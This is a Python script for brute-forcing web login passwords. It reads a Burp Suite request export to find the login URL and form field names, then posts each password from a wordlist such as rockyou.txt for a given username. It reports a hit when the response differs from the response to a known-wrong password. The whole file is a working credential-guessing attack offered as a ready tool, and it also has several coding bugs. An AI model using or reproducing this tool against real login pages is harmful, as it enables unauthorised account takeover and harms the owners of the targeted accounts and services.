import optparse
import sys
import array
import requests
import xml.etree.ElementTree as ET
import base64

print(

    "Welcome to the bruteforcer, usage: python3 bruteforcer.py -u 'admin' -P /usr/share/wordlists/rockyou.txt -r post.req")


def get_user_inputs():

    parse_object = optparse.OptionParser()

    parse_object.add_option("-u", "--username", dest="uname", help="username string")

    parse_object.add_option("-P", "--passwordlist", dest="passlist", help="password wordlist path for bforce")

    parse_object.add_option("-r", "--requestfile", dest="reqfile", help="file(xml) path of burp suite request")

    return parse_object.parse_args()


def parser(reqfile):

    with open(reqfile, "r") as myfile:
        datalst = myfile.readlines()
        datastr = ''.join(datalst)

    myroot = ET.fromstring(datastr)
    for x in myroot.findall('item'):
        request = x.find('request').text

    input = request
    output = base64.b64decode(input)
    req = output.decode('UTF-8')
    fields = req.split("\r\n")
    dr = fields[0]
    dr2 = dr.split()
    dr3 = dr2[1]
    method = fields[:1]
    method1 = str(method).split()
    method2 = str(method1[2]).split("'")
    method3 = method2[0]
    fields = fields[1:]  
    output2 = {}

    for field in fields:
        if field:
            data = field

    params = data.split('&')
    fname = params[0]
    fpass = params[1]
    password = fpass.split('=')
    username = fname.split('=')
    usernameparamater = username[0]
    passwordparamater = password[0]

    for field in fields:
        if not field:
            break
        key, value, *data2 = field.split(':')
        output2[key] = value

    host = output2['Host'].strip()
    try:
        cookie = output2['Cookie'].strip()

    except:
        cookie = None

    return (host, dr3, usernameparamater, passwordparamater, method3, cookie)





def bruteforcer(host, directory, username, passwlist, usernameparamater, passwordparamater, method, cookie):

    file1 = open(passwlist, 'r')
    pwlist = file1.readlines()

    if (method == 'HTTP/1.1'):
        method = 'http://'

    else:
        method = 'https://'

    for line in pwlist:

        global y

        try:

            url = '{0}{1}{2}'.format(method, host, directory)
            myobj1 = '{0}={1}&{2}=wr0ng-_0123495df0'.format(usernameparamater, username, passwordparamater)

            if cookie is not None:
                y = requests.post(url, data=myobj1, headers=cookie)

            else:
                y = requests.post(url, data=myobj1)

            url = '{0}{1}{2}'.format(method, host, directory)
            myobj2 = '{0}={1}&{2}={3}'.format(usernameparamater, username, passwordparamater, line)
            if cookie is not None:
                x = requests.post(url, data=myobj2, headers=cookie)
            else:
                x = requests.post(url, data=myobj2)

        except:
            print("error while requesting")

        if (y.text != x.text and (x.status_code == 200 or x.status_code == 301 or x.status_code == 302)):

            print("username:{0} and the password:{1}are true".format(username, line))
            sys.exit()

        else:
            print("username: {0} and the password: {1}are wrong".format(username, line))





print("\n BruteForce Tool is Started!! \n")

(user_input, arguments) = get_user_inputs()
params = parser(user_input.reqfile)
bruteforcer(params[0], params[1], user_input.uname, user_input.passlist, params[2], params[3], params[4], params[5])